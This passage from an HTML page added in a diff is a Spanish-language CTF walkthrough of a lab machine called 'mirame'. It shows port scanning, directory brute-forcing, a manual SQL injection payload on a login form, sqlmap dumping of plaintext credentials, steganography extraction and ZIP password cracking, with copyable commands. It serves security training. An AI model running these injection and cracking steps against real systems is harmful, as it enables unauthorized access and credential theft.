+        <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p- -sSCV -n -Pn</span> <span class="flag">--min-rate=5000 --open</span> <span class="arg">172.17.0.2</span> <span class="flag">-oX</span> <span class="arg">mirame.xml</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-02 15:28 -0400</div>
+        <div>Nmap scan report for 172.17.0.2</div>
+        <div><span class="o-green">Host is up</span> (0.00012s latency).</div>
+        <div>Not shown: 45164 closed tcp ports (reset), 20369 filtered tcp ports (no-response)</div>
+        <div class="o-white">PORT&nbsp;&nbsp; STATE SERVICE VERSION</div>
+        <div><span class="o-cyan">22/tcp open  ssh</span>&nbsp;&nbsp;&nbsp; OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)</div>
+        <div>| ssh-hostkey:</div>
+        <div>|&nbsp;&nbsp; 256 2c:ea:4a:d7:b4:c3:d4:e2:65:29:6c:12:c4:58:c9:49 (ECDSA)</div>
+        <div>|_  256 a7:a4:a4:2e:3b:c6:0a:e4:ec:bd:46:84:68:02:5d:30 (ED25519)</div>
+        <div><span class="o-cyan">80/tcp open  http</span>&nbsp;&nbsp; Apache httpd 2.4.61 ((Debian))</div>
+        <div>|_http-server-header: Apache/2.4.61 (Debian)</div>
+        <div><span class="o-yellow">|_http-title: Login Page</span></div>
+        <div>MAC Address: DA:42:15:4E:B7:5D (Unknown)</div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 34.36 seconds</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ANÁLISIS DEL SCAN</p>
+        <p>Nmap detectó dos puertos: <strong>SSH en el 22</strong> (sin credenciales aún, no podemos entrar) y <strong>HTTP en el 80</strong> con título <strong>"Login Page"</strong>. Esto apunta directamente a un formulario de autenticación web como vector de ataque. El siguiente paso es enumerar el contenido web para entender qué archivos y directorios existen.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">3</div>
+        <span class="step-title">CONVERSIÓN DEL REPORTE NMAP A HTML</span>
+      </div>
+      <div class="prose">
+        <p>
+          El archivo <span class="hl-cyan">mirame.xml</span> generado por Nmap está en formato
+          XML crudo, difícil de leer. La herramienta <strong>xsltproc</strong> transforma ese
+          XML en un reporte HTML visualmente organizado usando la hoja de estilos oficial que
+          trae Nmap en <span class="hl-cyan">/usr/share/nmap/nmap.xsl</span>. El operador
+          <span class="hl-cyan">&gt;</span> redirige la salida estándar al archivo
+          <span class="hl">mirame.html</span>, que se puede abrir en el navegador y muestra
+          los puertos, versiones y scripts en un formato con tablas y colores.
+          Es una buena práctica de documentación, especialmente en scans extensos.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="xsltproc /usr/share/nmap/nmap.xsl mirame.xml > mirame.html">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">XSLTPROC</span>
+        <div><span class="prompt">$ </span><span class="cmd">xsltproc <span class="arg">/usr/share/nmap/nmap.xsl</span> <span class="arg">mirame.xml</span> &gt; <span class="arg">mirame.html</span></span></div>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ENUMERACIÓN WEB -->
+    <div class="section" id="enumeracion">
+      <p class="section-label">// 04</p>
+      <h2 class="section-title">Enumeración Web con Gobuster</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">4</div>
+        <span class="step-title">FUERZA BRUTA DE DIRECTORIOS Y ARCHIVOS</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el puerto 80 activo y sabiendo que hay una página de Login, se usa
+          <strong>Gobuster</strong> en modo <em>dir</em> para descubrir archivos y directorios
+          ocultos mediante fuerza bruta de diccionario. El flag
+          <span class="hl-cyan">-u http://172.17.0.2</span> especifica la URL objetivo,
+          <span class="hl-cyan">-w</span> señala el diccionario a usar
+          (<span class="hl">common.txt</span> de dirb, con las rutas más comunes en servidores web),
+          y <span class="hl-cyan">-x txt,php,bak,old</span> indica las extensiones de archivo
+          que Gobuster añadirá a cada palabra del diccionario. Esto es crucial: un servidor puede
+          no tener un directorio <em>/admin</em> pero sí un archivo <em>/admin.php</em> —
+          sin la flag <span class="hl-cyan">-x</span> ese archivo quedaría sin descubrir.
+        </p>
+        <p>
+          El resultado muestra que los archivos con <strong>código 200</strong> (accesibles)
+          son: <span class="hl-cyan">index.php</span> (la página de login principal),
+          <span class="hl-cyan">auth.php</span> (el backend que procesa las credenciales)
+          y <span class="hl-cyan">page.php</span> (una página a la que redirige el login tras
+          autenticarse). Los archivos con código <strong>403</strong> existen pero el servidor
+          deniega el acceso directo (archivos de configuración de Apache como .htaccess).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x txt,php,bak,old">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">GOBUSTER</span>
+        <div><span class="prompt">$ </span><span class="cmd">gobuster <span class="flag">dir</span> <span class="flag">-u</span> <span class="arg">http://172.17.0.2</span> <span class="flag">-w</span> <span class="arg">/usr/share/wordlists/dirb/common.txt</span> <span class="flag">-x</span> <span class="arg">txt,php,bak,old</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Gobuster v3.8.2</div>
+        <div>by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</div>
+        <div>[+] Url:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; http://172.17.0.2</div>
+        <div>[+] Method:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GET</div>
+        <div>[+] Wordlist:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /usr/share/wordlists/dirb/common.txt</div>
+        <div>[+] Extensions:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; php,bak,old,txt</div>
+        <div>&nbsp;</div>
+        <div><span class="o-red">.htaccess</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Status: 403) [Size: 275]</div>
+        <div><span class="o-red">.htpasswd</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (Status: 403) [Size: 275]</div>
+        <div><span class="o-green">auth.php</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 200) [Size: 1852]</div>
+        <div><span class="o-green">index.php</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 200) [Size: 2351]</div>
+        <div><span class="o-green">page.php</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;(Status: 200) [Size: 2169]</div>
+        <div><span class="o-red">server-status</span>&nbsp;&nbsp;&nbsp;&nbsp;(Status: 403) [Size: 275]</div>
+        <div>Progress: 23065 / 23065 (100.00%)</div>
+        <div>Finished</div>
+      </div>
+
+      <div class="warn-box">
+        <p class="warn-box-title">// HALLAZGO CLAVE: auth.php</p>
+        <p>El archivo <strong>auth.php</strong> es el procesador del formulario de login. Al existir como archivo accesible y separado del index, podemos intuir que las credenciales se envían por POST directamente a este endpoint. Esto será fundamental para capturar el request con Burp Suite y pasárselo a sqlmap.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SQL INJECTION MANUAL -->
+    <div class="section" id="sqli">
+      <p class="section-label">// 05</p>
+      <h2 class="section-title">SQL Injection — Detección Manual</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Antes de lanzar herramientas automáticas, se realiza una prueba manual para confirmar
+          que el formulario de login es vulnerable a inyección SQL. Esto es una buena práctica:
+          entender primero qué ocurre manualmente antes de automatizar.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">5</div>
+        <span class="step-title">PRUEBA DE INYECCIÓN MANUAL — DETECCIÓN DE ERROR SQL</span>
+      </div>
+      <div class="prose">
+        <p>
+          Se navega a <span class="hl-cyan">http://172.17.0.2</span> y se observa un formulario
+          de login con dos campos: <strong>Usuario</strong> y <strong>Contraseña</strong>. La hipótesis
+          es que el backend construye una query SQL similar a esta para validar el login:
+        </p>
+        <p>
+          <span class="hl-cyan">SELECT * FROM usuarios WHERE username='[INPUT]' AND password='[INPUT]'</span>
+        </p>
+        <p>
+          Si el input no se sanitiza, podemos romper la estructura de la query. Se introduce
+          <span class="hl-red">'admin' --'</span> en el campo usuario (cualquier texto en
+          contraseña). El apóstrofe inicial cierra el string de la query prematuramente, y el
+          doble guion <span class="hl-cyan">--</span> actúa como comentario en SQL, ignorando
+          todo lo que sigue (incluyendo la validación de contraseña).
+        </p>
+        <p>
+          La respuesta del servidor es un <strong>error fatal de PHP/MySQL visible</strong> en
+          pantalla: revela que el código de <span class="hl-cyan">auth.php</span> está en la
+          línea 22, que usa MariaDB, y que la query falló porque recibió nuestra inyección sin
+          escapar. Este tipo de error no debería nunca mostrarse en producción — es una grave
+          falla de configuración que nos confirma que el campo es inyectable con
+          <span class="hl-red">Single Quoted String</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="'admin' --'">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">LOGIN FIELD → USUARIO</span>
+        <div><span class="prompt">usuario &gt; </span><span class="cmd"><span class="arg">'admin' --'</span></span></div>
+        <div><span class="prompt">password &gt; </span><span class="cmd"><span class="arg">cualquiercosa</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div class="o-red">Fatal error: Uncaught mysqli_sql_exception:</div>
+        <div class="o-red">You have an error in your SQL syntax;</div>
+        <div class="o-yellow">check the manual that corresponds to your MariaDB server version</div>
+        <div>for the right syntax to use near</div>
+        <div><span class="o-cyan">'admin' -- '' AND password=''admin' -- '''</span></div>
+        <div>at line 1 in <span class="o-green">/var/www/html/auth.php:22</span></div>
+        <div>Stack trace: #0 /var/www/html/auth.php(22): mysqli-&gt;query()</div>
+        <div>#1 {main} thrown in /var/www/html/auth.php on line 22</div>
+      </div>
+
+      <div class="sqli-box">
+        <p class="sqli-box-title">// ¿POR QUÉ ESTO CONFIRMA LA VULNERABILIDAD?</p>
+        <p>Un formulario <strong>seguro</strong> usaría <em>prepared statements</em> o escapado de caracteres especiales. En ese caso, el apóstrofe sería tratado como texto literal y no rompería la query. Aquí, el servidor ejecutó el input directamente dentro de la query SQL sin ningún filtro, y encima devolvió el error completo con rutas del servidor — dos fallos críticos en uno: <strong>SQL Injection</strong> + <strong>error verbose</strong>.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- SQLMAP -->
+    <div class="section" id="sqlmap">
+      <p class="section-label">// 06</p>
+      <h2 class="section-title">sqlmap — Extracción de la Base de Datos</h2>
+      <div class="section-line"></div>
+
+      <div class="prose">
+        <p>
+          Confirmada la vulnerabilidad SQL Injection, se automatiza la extracción usando
+          <strong>sqlmap</strong> — la herramienta estándar del sector para pruebas de
+          inyección SQL. Antes de ejecutarla, necesitamos capturar el request HTTP completo
+          del formulario de login para que sqlmap sepa exactamente qué enviar al servidor.
+        </p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">6</div>
+        <span class="step-title">CAPTURA DEL REQUEST HTTP CON BURP SUITE</span>
+      </div>
+      <div class="prose">
+        <p>
+          <strong>Burp Suite</strong> es un proxy HTTP de interceptación. Al configurar el
+          navegador para que pase todo su tráfico a través de Burp (generalmente
+          <span class="hl-cyan">127.0.0.1:8080</span>), podemos ver, modificar y guardar
+          cada request y response. En este caso, se activa <em>Intercept On</em>, se hace
+          un intento de login normal con credenciales de prueba (<span class="hl-cyan">admin/admin</span>),
+          y Burp captura el request POST antes de que llegue al servidor.
+        </p>
+        <p>
+          Se guarda ese request completo en un archivo de texto llamado
+          <span class="hl-cyan">request.txt</span>. Este archivo contiene todos los headers
+          HTTP y el body del POST con los parámetros <span class="hl">username</span> y
+          <span class="hl">password</span>. sqlmap usará este archivo como plantilla para
+          saber exactamente cómo y dónde inyectar sus payloads.
+        </p>
+      </div>
+
+      <div class="output-block">
+        <div class="o-white">POST /auth.php HTTP/1.1</div>
+        <div>Host: 172.17.0.2</div>
+        <div>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0</div>
+        <div>Content-Type: application/x-www-form-urlencoded</div>
+        <div>Content-Length: 28</div>
+        <div>Origin: http://172.17.0.2</div>
+        <div>Referer: http://172.17.0.2/</div>
+        <div>&nbsp;</div>
+        <div><span class="o-green">username=admin&amp;password=admin</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">7</div>
+        <span class="step-title">SQLMAP — CONFIRMACIÓN DE INYECTABILIDAD</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con el flag <span class="hl-cyan">-r request.txt</span> se le pasa a sqlmap el
+          request guardado. sqlmap prueba automáticamente múltiples técnicas de inyección
+          en todos los parámetros del body del POST. Detecta que tanto
+          <span class="hl">username</span> como <span class="hl">password</span> son
+          inyectables mediante <strong>Boolean-based blind</strong> (respuestas distintas
+          según si la condición es verdadera o falsa), <strong>Error-based</strong>
+          (extrae datos a través de los mensajes de error de MySQL) y
+          <strong>Time-based blind</strong> (la respuesta tarda más si la condición es
+          verdadera). También confirma que el DBMS es <span class="hl-red">MySQL / MariaDB</span>
+          y que el servidor web es <span class="hl-cyan">Apache 2.4.61 en Linux Debian</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[INFO] <span class="o-green">the back-end DBMS is MySQL</span></div>
+        <div>web server operating system: Linux Debian</div>
+        <div>web application technology: Apache 2.4.61</div>
+        <div>back-end DBMS: <span class="o-yellow">MySQL &gt;= 5.1 (MariaDB fork)</span></div>
+        <div>[INFO] there were multiple injection points, please select:</div>
+        <div>[0] place: POST, parameter: <span class="o-cyan">username</span>, type: LIKE single quoted string (default)</div>
+        <div>[1] place: POST, parameter: <span class="o-cyan">password</span>, type: Single quoted string</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">8</div>
+        <span class="step-title">SQLMAP — LISTAR BASES DE DATOS (--dbs)</span>
+      </div>
+      <div class="prose">
+        <p>
+          El flag <span class="hl-cyan">--dbs</span> (databases) instruye a sqlmap para que
+          enumere todas las bases de datos disponibles en el servidor MySQL. Esto equivale
+          a ejecutar un <span class="hl-cyan">SHOW DATABASES;</span> pero de forma ciega,
+          a través de los parámetros inyectables. Cada carácter del nombre de cada base de
+          datos se extrae bit a bit mediante las técnicas de inyección detectadas anteriormente.
+          Se descubren dos bases de datos: <span class="hl">information_schema</span> (la base
+          de datos interna del sistema MySQL con metadatos) y <span class="hl-red">users</span>
+          (la base de datos de la aplicación, que es la que nos interesa).
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt --dbs">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP · DBS</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">--dbs</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[INFO] fetching database names</div>
+        <div>available databases [2]:</div>
+        <div>[*] <span class="o-green">information_schema</span></div>
+        <div>[*] <span class="o-red">users</span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">9</div>
+        <span class="step-title">SQLMAP — LISTAR TABLAS (-D users --tables)</span>
+      </div>
+      <div class="prose">
+        <p>
+          Con <span class="hl-cyan">-D users</span> se especifica que queremos operar sobre
+          la base de datos <em>users</em>, y <span class="hl-cyan">--tables</span> enumera
+          todas las tablas que contiene. sqlmap descubre una única tabla llamada
+          <span class="hl-red">usuarios</span>. Este nombre es muy descriptivo — casi seguro
+          contiene nombres de usuario y contraseñas.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt -D users --tables">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP · TABLES</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">users</span> <span class="flag">--tables</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>[INFO] fetching tables for database: 'users'</div>
+        <div>Database: users</div>
+        <div>[1 table]</div>
+        <div>+----------+</div>
+        <div>| <span class="o-green">usuarios</span> |</div>
+        <div>+----------+</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">10</div>
+        <span class="step-title">SQLMAP — VOLCAR TABLA (-T usuarios --dump)</span>
+      </div>
+      <div class="prose">
+        <p>
+          El flag <span class="hl-cyan">-T usuarios</span> selecciona la tabla específica y
+          <span class="hl-cyan">--dump</span> extrae todo su contenido. sqlmap primero
+          enumera las columnas de la tabla (descubre <em>id</em>, <em>username</em>,
+          <em>password</em>) y luego vuelca fila por fila cada registro. El resultado
+          revela <strong>4 usuarios con sus contraseñas en texto plano</strong> (no hasheadas):
+          este es un error de seguridad grave — las contraseñas nunca deben almacenarse en
+          texto claro.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="sqlmap -r request.txt -D users -T usuarios --dump">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">SQLMAP · DUMP</span>
+        <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">users</span> <span class="flag">-T</span> <span class="arg">usuarios</span> <span class="flag">--dump</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Database: users &nbsp; Table: usuarios &nbsp; [4 entries]</div>
+        <div>+----+-----------------------+------------------+</div>
+        <div>| id | password&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| username&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</div>
+        <div>+----+-----------------------+------------------+</div>
+        <div>|  1 | <span class="o-red">chocolateadministrador</span>| <span class="o-green">admin</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</div>
+        <div>|  2 | <span class="o-red">lucas</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| <span class="o-green">lucas</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</div>
+        <div>|  3 | <span class="o-red">soyagustin123</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;| <span class="o-green">agustin</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</div>
+        <div>|  4 | <span class="o-red">directoriotravieso</span>&nbsp;&nbsp;&nbsp;&nbsp;| <span class="o-green">directorio</span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;|</div>
+        <div>+----+-----------------------+------------------+</div>
+      </div>
+
+      <div class="cred-box">
+        <div class="cred-item"><div class="cred-label">USUARIO</div><div class="cred-val">admin</div></div>
+        <div class="cred-item"><div class="cred-label">PASS</div><div class="cred-val">chocolateadministrador</div></div>
+        <div class="cred-item"><div class="cred-label">USUARIO</div><div class="cred-val">directorio</div></div>
+        <div class="cred-item"><div class="cred-label">PASS</div><div class="cred-val">directoriotravieso</div></div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// PISTA OCULTA EN LAS CONTRASEÑAS</p>
+        <p>Al revisar las contraseñas con atención, la del usuario <strong>"directorio"</strong> es <strong>"directoriotravieso"</strong>. Esta combinación es una pista directa: sugiere que existe un <strong>directorio web oculto</strong> cuyo nombre podría estar relacionado con estas palabras. En CTFs, los nombres de cuentas y contraseñas suelen contener pistas del siguiente paso.</p>
+      </div>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ESTEGANOGRAFÍA -->
+    <div class="section" id="esteganografia">
+      <p class="section-label">// 07</p>
+      <h2 class="section-title">Esteganografía — Datos Ocultos en la Imagen</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">11</div>
+        <span class="step-title">GOBUSTER CON PASSWORDS COMO WORDLIST</span>
+      </div>
+      <div class="prose">
+        <p>
+          Teniendo las contraseñas de la base de datos, se construye una wordlist artesanal
+          combinando los nombres de usuario y contraseñas obtenidos. Se ejecuta un segundo
+          Gobuster pero ahora con ese archivo como diccionario en lugar del
+          <em>common.txt</em> genérico. La idea es que si algún directorio web tiene el
+          mismo nombre que una de estas palabras, lo encontraremos.
+        </p>
+        <p>
+          El resultado confirma la hipótesis: Gobuster encuentra el directorio
+          <span class="hl-red">/directoriotravieso</span> con código
+          <span class="hl-cyan">301 (Redirect)</span> apuntando a
+          <span class="hl-cyan">http://172.17.0.2/directoriotravieso/</span>.
+          Este directorio no aparecía en el scan anterior con <em>common.txt</em>
+          porque su nombre no es una palabra común — solo era descubrible con las pistas
+          extraídas de la base de datos.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="gobuster dir -u http://172.17.0.2 -w /home/kali/Desktop/HXPLOIT/4.ciclo/semana_5/mirame/pasword.txt -x txt,php,bak,old">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">GOBUSTER · CUSTOM WORDLIST</span>
+        <div><span class="prompt">$ </span><span class="cmd">gobuster <span class="flag">dir</span> <span class="flag">-u</span> <span class="arg">http://172.17.0.2</span> <span class="flag">-w</span> <span class="arg">pasword.txt</span> <span class="flag">-x</span> <span class="arg">txt,php,bak,old</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div><span class="o-green">directoriotravieso</span> &nbsp;(Status: 301) [Size: 321]</div>
+        <div>[--&gt; <span class="o-cyan">http://172.17.0.2/directoriotravieso/</span>]</div>
+        <div>Progress: 20 / 20 (100.00%)</div>
+        <div>Finished</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">12</div>
+        <span class="step-title">DESCARGA DE LA IMAGEN DESDE EL DIRECTORIO</span>
+      </div>
+      <div class="prose">
+        <p>
+          Al navegar a <span class="hl-cyan">http://172.17.0.2/directoriotravieso/</span>
+          se accede a un <strong>directory listing</strong> de Apache (el servidor está
+          configurado para mostrar el contenido del directorio cuando no hay un index.html).
+          Dentro hay un único archivo: <span class="hl-red">miramebien.jpg</span> — una
+          imagen de 6.2K. El nombre es una pista obvia: "mírame bien" implica que hay algo
+          más de lo que parece a simple vista. La imagen muestra un par de ojos, reforzando
+          el juego de palabras con el nombre de la máquina.
+        </p>
+        <p>
+          Se descarga la imagen con <span class="hl-cyan">wget</span> para analizarla localmente.
+          Cuando algo "se ve normal" pero tiene nombre sospechoso en un CTF, lo primero es
+          comprobar si contiene datos ocultos mediante <strong>esteganografía</strong>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="wget http://172.17.0.2/directoriotravieso/miramebien.jpg">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">WGET</span>
+        <div><span class="prompt">$ </span><span class="cmd">wget <span class="arg">http://172.17.0.2/directoriotravieso/miramebien.jpg</span></span></div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">13</div>
+        <span class="step-title">STEGSEEK — EXTRAER DATOS OCULTOS DE LA IMAGEN</span>
+      </div>
+      <div class="prose">
+        <p>
+          <strong>stegseek</strong> es una herramienta especializada en detectar y extraer
+          datos ocultos en imágenes JPEG usando el algoritmo de esteganografía
+          <strong>steghide</strong>. A diferencia de steghide, que necesita que conozcas la
+          passphrase de antemano, stegseek hace un ataque de diccionario automático: prueba
+          miles de passphrases por segundo hasta encontrar la correcta.
+        </p>
+        <p>
+          Por defecto, stegseek usa su lista de palabras interna basada en las más comunes.
+          El resultado es inmediato: encuentra la passphrase
+          <span class="hl-green">"chocolate"</span> (que aparecía también como parte de la
+          contraseña del admin en la base de datos — otro guiño del autor), extrae el
+          archivo oculto original cuyo nombre era <span class="hl-cyan">ocultito.zip</span>
+          y lo guarda como <span class="hl">miramebien.jpg.out</span>.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="stegseek miramebien.jpg">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">STEGSEEK</span>
+        <div><span class="prompt">$ </span><span class="cmd">stegseek <span class="arg">miramebien.jpg</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>StegSeek 0.6 - https://github.com/RickdeJager/StegSeek</div>
+        <div>&nbsp;</div>
+        <div>[i] Found passphrase: <span class="o-green">"chocolate"</span></div>
+        <div>[i] Original filename: <span class="o-cyan">"ocultito.zip"</span></div>
+        <div>[i] Extracting to "miramebien.jpg.out".</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ¿QUÉ ES ESTEGANOGRAFÍA?</p>
+        <p>La <strong>esteganografía</strong> es la práctica de ocultar información dentro de otros archivos de forma que la presencia del mensaje sea imperceptible. A diferencia de la criptografía (que oculta el <em>contenido</em>), la esteganografía oculta la <em>existencia</em> del mensaje. En imágenes JPEG, herramientas como steghide modifican los bits menos significativos de los píxeles de forma que el cambio visual es invisible para el ojo humano, pero el archivo contiene datos adicionales que pueden extraerse con la passphrase correcta.</p>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">14</div>
+        <span class="step-title">ZIP2JOHN — CONVERTIR ZIP CIFRADO A HASH CRACKEABLE</span>
+      </div>
+      <div class="prose">
+        <p>
+          El archivo extraído <span class="hl-cyan">miramebien.jpg.out</span> es en realidad
+          un ZIP (<em>ocultito.zip</em>) protegido por contraseña. No se puede descomprimir
+          directamente. La herramienta <strong>zip2john</strong> (parte del suite John the Ripper)
+          analiza el archivo ZIP y extrae la información de la contraseña en un formato de hash
+          que John the Ripper puede intentar crackear. El resultado se guarda en
+          <span class="hl-cyan">hash_mirabien.txt</span>.
+        </p>
+        <p>
+          Técnicamente, lo que extrae zip2john es el bloque de verificación PKZIP: un fragmento
+          cifrado del archivo que John puede usar para comprobar si una contraseña es correcta
+          sin necesidad de descomprimir el archivo completo. Esto hace el proceso muy rápido.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="zip2john miramebien.jpg.out > hash_mirabien.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">ZIP2JOHN</span>
+        <div><span class="prompt">$ </span><span class="cmd">zip2john <span class="arg">miramebien.jpg.out</span> &gt; <span class="arg">hash_mirabien.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>ver 1.0 efh 5455 efh 7875 miramebien.jpg.out/secret.txt</div>
+        <div>PKZIP Encr: 2b chk, TS_chk, cmplen=28, decmplen=16,</div>
+        <div>crc=703553BA ts=9D7A cs=9d7a type=0</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">15</div>
+        <span class="step-title">JOHN THE RIPPER — CRACKEAR EL HASH</span>
+      </div>
+      <div class="prose">
+        <p>
+          <strong>John the Ripper</strong> es una herramienta de crackeo de contraseñas que
+          prueba posibles contraseñas contra un hash hasta encontrar la que genera el mismo
+          resultado. Con el flag <span class="hl-cyan">--wordlist=/usr/share/wordlists/rockyou.txt</span>
+          se especifica el diccionario a usar: <strong>rockyou.txt</strong> es la wordlist
+          más usada en CTFs, derivada de una filtración real de 14 millones de contraseñas
+          del servicio RockYou en 2009. John prueba cada contraseña del diccionario contra
+          el hash extraído del ZIP.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="john --wordlist=/usr/share/wordlists/rockyou.txt hash_mirabien.txt">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">JOHN</span>
+        <div><span class="prompt">$ </span><span class="cmd">john <span class="flag">--wordlist=</span><span class="arg">/usr/share/wordlists/rockyou.txt</span> <span class="arg">hash_mirabien.txt</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Using default input encoding: UTF-8</div>
+        <div>Loaded 1 password hash (PKZIP [32/64])</div>
+        <div>No password hashes left to crack (see FAQ)</div>
+      </div>
+
+      <div class="step-marker">
+        <div class="step-num">16</div>
+        <span class="step-title">JOHN --SHOW — MOSTRAR CONTRASEÑA ENCONTRADA</span>
+      </div>
+      <div class="prose">
+        <p>
+          Una vez que John ha crackeado el hash (o si ya lo había crackeado en una sesión
+          anterior y lo tiene en caché), el flag <span class="hl-cyan">--show</span> muestra
+          todas las contraseñas encontradas para los hashes del archivo. El formato de salida
+          es <em>archivo:contraseña:...</em>. Se revela que la contraseña del ZIP es
+          <span class="hl-red">stupid1</span>.
+        </p>
+      </div>
+
